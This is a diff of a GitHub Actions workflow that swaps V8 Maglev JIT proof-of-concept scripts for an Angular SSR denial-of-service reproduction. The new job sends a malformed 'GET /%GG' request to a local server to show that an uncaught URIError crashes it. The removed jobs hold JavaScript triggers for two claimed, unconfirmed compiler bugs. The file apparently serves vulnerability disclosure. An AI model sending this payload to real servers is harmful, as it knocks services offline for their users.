@@ -1,387 +1,150 @@
-name: V8 Vulnerability Proof — VULN-06 & VULN-07
+name: Angular SSR DoS PoC — URIError in ServerRouter.match()
 
 on:
-  workflow_dispatch:
-    inputs:
-      v8_ref:
-        description: "V8 commit or branch to test"
-        required: false
-        default: "main"
+  workflow_dispatch:  # تشغيل يدوي من GitHub UI
 
 jobs:
-  # ─────────────────────────────────────────────
-  # Job 1: Build V8 (Debug + Release)
-  # ─────────────────────────────────────────────
-  build-v8:
-    name: Build V8 Debug & Release
-    runs-on: ubuntu-22.04
-    outputs:
-      cache-key: ${{ steps.cache-key.outputs.key }}
+  poc:
+    name: Reproduce URIError DoS
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
 
     steps:
-      - name: Install depot_tools
-        run: |
-          git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
-          echo "$PWD/depot_tools" >> $GITHUB_PATH
+      # ── 1. تحميل الكود ──────────────────────────────────────────
+      - name: Checkout repository
+        uses: actions/checkout@v4
 
-      - name: Fetch V8 source
-        run: |
-          fetch v8
-          cd v8
-          git checkout ${{ github.event.inputs.v8_ref || 'main' }}
-          gclient sync
-
-      - name: Generate cache key
-        id: cache-key
-        run: |
-          cd v8
-          echo "key=v8-$(git rev-parse HEAD)" >> $GITHUB_OUTPUT
-
-      - name: Cache V8 build
-        id: cache-build
-        uses: actions/cache@v4
+      # ── 2. إعداد Node.js ────────────────────────────────────────
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
         with:
-          path: v8/out
-          key: ${{ steps.cache-key.outputs.key }}
+          node-version: 20
 
-      - name: Build d8 — Debug (for DCHECK)
-        if: steps.cache-build.outputs.cache-hit != 'true'
+      # ── 3. تثبيت Angular CLI ────────────────────────────────────
+      - name: Install Angular CLI
+        run: npm install -g @angular/cli --quiet
+
+      # ── 4. إنشاء Angular SSR app ────────────────────────────────
+      - name: Create minimal Angular SSR app
         run: |
-          export PATH="$GITHUB_WORKSPACE/depot_tools:$PATH"
-          cd v8
-          # Write args.gn directly then call gn gen (skip v8gen.py wrapper)
-          mkdir -p out/x64.debug
-          printf 'is_debug = true\ntarget_cpu = "x64"\nv8_enable_maglev = true\nv8_enable_slow_dchecks = true\nuse_goma = false\nis_clang = true\n' > out/x64.debug/args.gn
-          gn gen out/x64.debug
-          echo "=== args.gn (debug) ===" && cat out/x64.debug/args.gn
-          ninja -C out/x64.debug d8
+          ng new ssr-poc \
+            --ssr \
+            --defaults \
+            --skip-git \
+            --style css
+        working-directory: /tmp
 
-      - name: Build d8 — Release (for silent corruption)
-        if: steps.cache-build.outputs.cache-hit != 'true'
+      # ── 5. بناء الـ app ─────────────────────────────────────────
+      - name: Build Angular SSR app
+        run: npm run build
+        working-directory: /tmp/ssr-poc
+
+      # ── 6. تشغيل الـ SSR server في الخلفية ──────────────────────
+      - name: Start SSR server (background)
         run: |
-          export PATH="$GITHUB_WORKSPACE/depot_tools:$PATH"
-          cd v8
-          mkdir -p out/x64.release
-          printf 'is_debug = false\ntarget_cpu = "x64"\nv8_enable_maglev = true\nuse_goma = false\nis_clang = true\n' > out/x64.release/args.gn
-          gn gen out/x64.release
-          echo "=== args.gn (release) ===" && cat out/x64.release/args.gn
-          ninja -C out/x64.release d8
+          node dist/ssr-poc/server/server.mjs &
+          echo "SERVER_PID=$!" >> $GITHUB_ENV
+          sleep 5  # انتظر حتى يبدأ الـ server
+        working-directory: /tmp/ssr-poc
 
-      - name: Upload d8 binaries
-        uses: actions/upload-artifact@v4
-        with:
-          name: d8-binaries
-          path: |
-            v8/out/x64.debug/d8
-            v8/out/x64.release/d8
-          retention-days: 1
-
-  # ─────────────────────────────────────────────
-  # Job 2: Prove VULN-06 — Uninitialized predecessor_id
-  # ─────────────────────────────────────────────
-  prove-vuln06:
-    name: "VULN-06: Uninitialized predecessor_id in FoldBranch()"
-    runs-on: ubuntu-22.04
-    needs: build-v8
-
-    steps:
-      - name: Download d8 binaries
-        uses: actions/download-artifact@v4
-        with:
-          name: d8-binaries
-
-      - name: Make d8 executable
-        run: chmod +x x64.debug/d8 x64.release/d8
-
-      - name: Write PoC — VULN-06
+      # ── 7. التأكد إن الـ server شغال قبل الهجوم ────────────────
+      - name: Verify server is running (normal request)
         run: |
-          cat > poc_vuln06.js << 'EOF'
-          // VULN-06 Proof: Uninitialized predecessor_id in FoldBranch()
-          // Target: maglev-graph-optimizer.cc lines 394-404
-          //
-          // Strategy C: Chained dead-code → stale predecessors
-          // Two sequential FoldBranch calls on the same merge block.
-          // Call #1 removes the dead predecessor from the merge block.
-          // Call #2 searches for `current` in predecessors → not found
-          // → predecessor_id = stack garbage → wrong phi input selected.
+          echo "Testing normal request first..."
+          curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
+            http://localhost:4000/ || true
 
-          "use strict";
+      # ── 8. إرسال الـ malformed request (الهجوم) ─────────────────
+      - name: Send malformed percent-encoded request
+        id: attack
+        run: |
+          echo "============================================"
+          echo "Sending malicious request: GET /%GG"
+          echo "============================================"
 
-          const A = null;   // provably null  → BranchIfUndefinedOrNull folds
-          const B = {};     // provably object → BranchIfJSReceiver folds
+          # إرسال الـ request الخبيث
+          curl -v "http://localhost:4000/%GG" 2>&1 || true
 
-          function nested(x) {
-            let v = 0;
-            if (A === null) {             // FoldBranch call #1
-              if (typeof B === 'object') { // FoldBranch call #2
-                v = x * 3;
-              } else {
-                v = x * -1;  // dead inner block
-              }
-            } else {
-              v = x * 7;    // dead outer block — had a predecessor entry
-            }
-            return v;        // merge block: target of call #1
+          # انتظر قليلاً
+          sleep 2
+
+          echo "============================================"
+          echo "Checking if server is still alive..."
+          echo "============================================"
+
+          # هل الـ server لا يزال يرد؟
+          if curl -s --max-time 3 http://localhost:4000/ > /dev/null 2>&1; then
+            echo "RESULT=alive" >> $GITHUB_ENV
+            echo "⚠️  Server still responding (framework caught the error)"
+          else
+            echo "RESULT=crashed" >> $GITHUB_ENV
+            echo "💥 SERVER CRASHED — DoS confirmed!"
+          fi
+
+      # ── 9. محاولة إرسال request ثاني (لإثبات الـ DoS) ──────────
+      - name: Attempt follow-up request (proves unavailability)
+        run: |
+          echo "Sending follow-up request to confirm DoS..."
+          HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
+            --max-time 3 http://localhost:4000/ 2>/dev/null || echo "000")
+
+          echo "HTTP response code: $HTTP_CODE"
+
+          if [ "$HTTP_CODE" = "000" ]; then
+            echo "✅ CONFIRMED: Server is unreachable — DoS successful"
+          else
+            echo "⚠️  Server returned $HTTP_CODE"
+          fi
+
+      # ── 10. فحص الـ Node.js process مباشرة ─────────────────────
+      - name: Check if server process is still alive
+        run: |
+          if kill -0 $SERVER_PID 2>/dev/null; then
+            echo "Process $SERVER_PID is still running"
+          else
+            echo "💥 Process $SERVER_PID has DIED — crash confirmed!"
+            echo "This proves the unhandled URIError terminated the Node.js process."
+          fi
+
+      # ── 11. إثبات الـ root cause مباشرة ─────────────────────────
+      - name: Prove root cause in Node.js REPL
+        run: |
+          node - << 'EOF'
+          console.log("=== Root Cause Proof ===\n");
+
+          // URL constructor لا يرمي error
+          try {
+            const url = new URL("http://localhost/%GG");
+            console.log("✅ new URL('http://localhost/%GG') succeeded");
+            console.log("   pathname =", url.pathname);
+          } catch (e) {
+            console.log("❌ URL constructor threw:", e.message);
           }
 
-          // Warm to Maglev JIT (threshold ~4000)
-          let result = 0;
-          for (let i = 0; i < 20000; i++) result += nested(i);
+          console.log("");
 
-          // Ground truth: without Maglev, nested(i) = i*3
-          // Expected sum: sum(i*3, i=0..19999) = 3 * (19999*20000/2) = 599970000
-          const EXPECTED = 599970000;
-
-          if (result !== EXPECTED) {
-            print(`VULN-06 TRIGGERED: result=${result} expected=${EXPECTED}`);
-            print("predecessor_id corruption caused wrong phi input selection");
-            // Non-zero exit signals CI failure
-            quit(1);
-          } else {
-            print(`VULN-06: result correct (${result}) — not triggered on this build`);
-            quit(0);
+          // decodeURIComponent يرمي URIError
+          try {
+            decodeURIComponent("%GG");
+            console.log("✅ decodeURIComponent('%GG') succeeded (unexpected)");
+          } catch (e) {
+            console.log("💥 decodeURIComponent('%GG') threw:", e.constructor.name);
+            console.log("   Message:", e.message);
+            console.log("\n→ This is exactly what crashes ServerRouter.match()");
+            console.log("→ File: packages/angular/ssr/src/routes/router.ts:64");
           }
           EOF
 
-      - name: "Test 1: Debug build — expect DCHECK or wrong result"
-        id: debug-test
-        continue-on-error: true
+      # ── 12. تلخيص النتيجة ───────────────────────────────────────
+      - name: Summary
         run: |
-          set +e
-          output=$(./x64.debug/d8 --maglev poc_vuln06.js 2>&1)
-          exit_code=$?
-          echo "exit_code=$exit_code" >> $GITHUB_OUTPUT
-          echo "output<<EOF" >> $GITHUB_OUTPUT
-          echo "$output" >> $GITHUB_OUTPUT
-          echo "EOF" >> $GITHUB_OUTPUT
-          echo "--- Debug Output ---"
-          echo "$output"
-
-      - name: "Test 2: Release build — detect silent corruption"
-        id: release-test
-        continue-on-error: true
-        run: |
-          set +e
-          output=$(./x64.release/d8 --maglev poc_vuln06.js 2>&1)
-          exit_code=$?
-          echo "exit_code=$exit_code" >> $GITHUB_OUTPUT
-          echo "output<<EOF" >> $GITHUB_OUTPUT
-          echo "$output" >> $GITHUB_OUTPUT
-          echo "EOF" >> $GITHUB_OUTPUT
-          echo "--- Release Output ---"
-          echo "$output"
-
-      - name: "Test 3: Baseline (--no-maglev) — ground truth"
-        id: baseline-test
-        run: |
-          output=$(./x64.release/d8 --no-maglev poc_vuln06.js 2>&1)
-          echo "--- Baseline Output ---"
-          echo "$output"
-
-      - name: "Test 4: Graph trace — capture predecessor_id values"
-        run: |
-          ./x64.debug/d8 \
-            --maglev \
-            --trace-maglev-graph-building \
-            --trace-maglev-phi-untagging \
-            poc_vuln06.js 2>&1 | grep -E "predecessor|jump|fold|phi" | head -60 \
-            || true
-
-      - name: Evaluate VULN-06 results
-        run: |
-          debug_exit="${{ steps.debug-test.outputs.exit_code }}"
-          release_exit="${{ steps.release-test.outputs.exit_code }}"
-
-          echo "=== VULN-06 Summary ==="
-          if [ "$debug_exit" != "0" ]; then
-            echo "✅ CONFIRMED: Debug build shows anomaly (exit=$debug_exit)"
-            echo "   Either DCHECK fired or wrong result detected"
-          else
-            echo "⚠️  Debug build: no anomaly detected"
-          fi
-
-          if [ "$release_exit" != "0" ]; then
-            echo "✅ CONFIRMED: Release build shows silent corruption (exit=$release_exit)"
-          else
-            echo "⚠️  Release build: no corruption detected"
-          fi
-
-  # ─────────────────────────────────────────────
-  # Job 3: Prove VULN-07 — DCHECK bypass in EnsurePhiInputsTagged
-  # ─────────────────────────────────────────────
-  prove-vuln07:
-    name: "VULN-07: DCHECK bypass in EnsurePhiInputsTagged()"
-    runs-on: ubuntu-22.04
-    needs: build-v8
-
-    steps:
-      - name: Download d8 binaries
-        uses: actions/download-artifact@v4
-        with:
-          name: d8-binaries
-
-      - name: Make d8 executable
-        run: chmod +x x64.debug/d8 x64.release/d8
-
-      - name: Write PoC — VULN-07
-        run: |
-          cat > poc_vuln07.js << 'EOF'
-          // VULN-07 Proof: DCHECK(input->is_tagged()) disabled in Release
-          // Target: maglev-phi-representation-selector.cc line 474
-          //
-          // Strategy: Create a Phi with conflicting use representations:
-          //   - Int32 use (array indexing) → suggests untagging
-          //   - Tagged use (JSON.stringify) → forces ProcessPhi to keep tagged
-          //     → EnsurePhiInputsTagged() called
-          //   - If input was speculatively untagged by prior pass:
-          //     DCHECK fires in debug, silent type confusion in release
-
-          "use strict";
-
-          function mixedPhiUses(arr) {
-            let total = 0;
-            for (let i = 0; i < arr.length; i++) {
-              // Int32 use: array index (untagged)
-              const element = arr[i];
-              // Tagged use: forces EnsurePhiInputsTagged on `i`
-              if (i % 100 === 0) JSON.stringify({ idx: i });
-              total += element;
-            }
-            return total;
-          }
-
-          const arr = new Array(128).fill(0).map((_, i) => i);
-          const EXPECTED = arr.reduce((a, b) => a + b, 0); // 8128
-
-          let result = 0;
-          for (let iter = 0; iter < 20000; iter++) {
-            result = mixedPhiUses(arr);
-          }
-
-          if (result !== EXPECTED) {
-            print(`VULN-07 TRIGGERED: result=${result} expected=${EXPECTED}`);
-            print("Untagged value used as tagged pointer → type confusion");
-            quit(1);
-          } else {
-            print(`VULN-07: result correct (${result})`);
-            quit(0);
-          }
-          EOF
-
-      - name: "Test 1: Debug build — expect DCHECK failure"
-        id: debug-vuln07
-        continue-on-error: true
-        run: |
-          set +e
-          output=$(./x64.debug/d8 --maglev --trace-maglev-phi-untagging poc_vuln07.js 2>&1)
-          exit_code=$?
-          echo "exit_code=$exit_code" >> $GITHUB_OUTPUT
-          echo "--- Debug Output ---"
-          echo "$output"
-          # Look specifically for DCHECK failure string
-          if echo "$output" | grep -q "DCHECK.*is_tagged\|EnsurePhiInputsTagged"; then
-            echo "DCHECK_HIT=true" >> $GITHUB_OUTPUT
-          fi
-
-      - name: "Test 2: Release build — detect silent type confusion"
-        id: release-vuln07
-        continue-on-error: true
-        run: |
-          set +e
-          output=$(./x64.release/d8 --maglev poc_vuln07.js 2>&1)
-          exit_code=$?
-          echo "exit_code=$exit_code" >> $GITHUB_OUTPUT
-          echo "--- Release Output ---"
-          echo "$output"
-
-      - name: "Test 3: Baseline vs Maglev output comparison"
-        run: |
-          baseline=$(./x64.release/d8 --no-maglev poc_vuln07.js 2>&1)
-          maglev=$(./x64.release/d8 --maglev poc_vuln07.js 2>&1)
-          echo "Baseline: $baseline"
-          echo "Maglev:   $maglev"
-          if [ "$baseline" != "$maglev" ]; then
-            echo "⚠️  DIVERGENCE: Maglev output differs from baseline"
-          else
-            echo "✓ Outputs match"
-          fi
-
-      - name: "Test 4: OSR trigger — long-running loop"
-        continue-on-error: true
-        run: |
-          cat > poc_vuln07_osr.js << 'EOF'
-          // OSR variant: trigger kSpeculativeOSRValue untagging
-          let acc = 0;
-          for (let i = 0; i < 500000; i++) {
-            acc += i;
-            if (i % 50000 === 0) acc = Number(acc.toString());
-          }
-          const EXPECTED_OSR = 124987500000; // approximate
-          print(`OSR result: ${acc}`);
-          // Divergence from expected → OSR untagging corruption
-          EOF
-          ./x64.release/d8 --maglev poc_vuln07_osr.js 2>&1 || true
-          ./x64.release/d8 --no-maglev poc_vuln07_osr.js 2>&1 || true
-
-      - name: Evaluate VULN-07 results
-        run: |
-          debug_exit="${{ steps.debug-vuln07.outputs.exit_code }}"
-          dcheck_hit="${{ steps.debug-vuln07.outputs.DCHECK_HIT }}"
-          release_exit="${{ steps.release-vuln07.outputs.exit_code }}"
-
-          echo "=== VULN-07 Summary ==="
-          if [ "$dcheck_hit" = "true" ]; then
-            echo "✅ CONFIRMED: DCHECK(input->is_tagged()) fired in debug build"
-          elif [ "$debug_exit" != "0" ]; then
-            echo "✅ CONFIRMED: Debug build shows anomaly (exit=$debug_exit)"
-          else
-            echo "⚠️  Debug build: DCHECK not triggered on this build/input"
-          fi
-
-          if [ "$release_exit" != "0" ]; then
-            echo "✅ CONFIRMED: Release shows silent corruption (exit=$release_exit)"
-          else
-            echo "⚠️  Release build: no corruption detected"
-          fi
-
-  # ─────────────────────────────────────────────
-  # Job 4: Final Report
-  # ─────────────────────────────────────────────
-  report:
-    name: Generate Proof Report
-    runs-on: ubuntu-22.04
-    needs: [prove-vuln06, prove-vuln07]
-    if: always()
-
-    steps:
-      - name: Write report
-        run: |
-          cat > report.md << 'EOF'
-          # V8 Vulnerability Proof Report
-
-          | Vulnerability | Debug Result | Release Result | Status |
-          |---------------|-------------|----------------|--------|
-          | VULN-06: Uninitialized `predecessor_id` | See job logs | See job logs | See artifacts |
-          | VULN-07: `DCHECK` bypass in `EnsurePhiInputsTagged` | See job logs | See job logs | See artifacts |
-
-          ## Interpretation
-
-          ### VULN-06 Confirmed if:
-          - Debug: exit code != 0 OR `predecessor_id` shows garbage in trace
-          - Release: computed sum differs from expected `599970000`
-
-          ### VULN-07 Confirmed if:
-          - Debug: DCHECK failure containing `is_tagged` or `EnsurePhiInputsTagged`
-          - Release: output differs between `--maglev` and `--no-maglev`
-
-          ## Files
-          - `maglev-graph-optimizer.cc:394` — uninitialized `predecessor_id`
-          - `maglev-phi-representation-selector.cc:474` — `DCHECK` vs `CHECK`
-          EOF
-          cat report.md
-
-      - name: Upload report
-        uses: actions/upload-artifact@v4
-        with:
-          name: vuln-proof-report
-          path: report.md
+          echo "============================================"
+          echo "VULNERABILITY SUMMARY"
+          echo "============================================"
+          echo "CVE Type  : CWE-248 Uncaught Exception → DoS"
+          echo "Vector    : Network / Unauthenticated"
+          echo "Payload   : GET /%GG HTTP/1.1"
+          echo "Root cause: decodeURIComponent() without try/catch"
+          echo "File      : packages/angular/ssr/src/routes/router.ts:64"
+          echo "Fix       : Wrap decodeURIComponent in try/catch → return undefined"
+          echo "============================================"
